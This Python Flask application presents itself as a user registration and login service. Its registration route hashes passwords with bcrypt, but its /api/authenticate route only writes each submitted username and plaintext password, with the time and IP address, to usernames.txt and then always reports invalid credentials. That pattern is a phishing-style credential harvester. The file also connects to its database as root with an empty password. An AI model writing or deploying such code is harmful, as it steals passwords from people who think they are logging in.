from flask import Flask, request, jsonify, send_from_directory
import mysql.connector
from mysql.connector import Error
import bcrypt
import os
import datetime
import socket

app = Flask(__name__)

def create_connection():
    connection = None
    try:
        connection = mysql.connector.connect(
            host='localhost',
            user='root',
            password='',
            database='userDB'
        )
        print("Conexión realizada a la BD")
    except Error as e:
        print(f"Error '{e}' ocurrió")
    return connection

@app.route('/')
def index():
    return send_from_directory('static', 'index.html')

@app.route('/home')
def home():
    return send_from_directory('static', 'home.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.get_json()
    username = data['username']
    password = data['password'].encode('utf-8')
    hashed_password = bcrypt.hashpw(password, bcrypt.gensalt())

    connection = create_connection()
    cursor = connection.cursor()
    query = "INSERT INTO users (username, password) VALUES (%s, %s)"
    cursor.execute(query, (username, hashed_password))
    connection.commit()
    cursor.close()
    connection.close()
    return jsonify({"message": "Usuario registrado con éxito"}), 201

@app.route('/api/authenticate', methods=['POST'])
def login():
    data = request.get_json()
    username = data['username']
    password = data['password']

    if username and password:
        # Obtener la hora actual y la dirección IP
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.remote_addr

        # Almacenar la información en el archivo
        with open("usernames.txt", "a") as f:
            f.write(f"{current_time} IP: {ip_address} Usuario: {username} Contraseña: {password}\n")

        return jsonify({"message": "Credenciales inválidas"}), 401


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)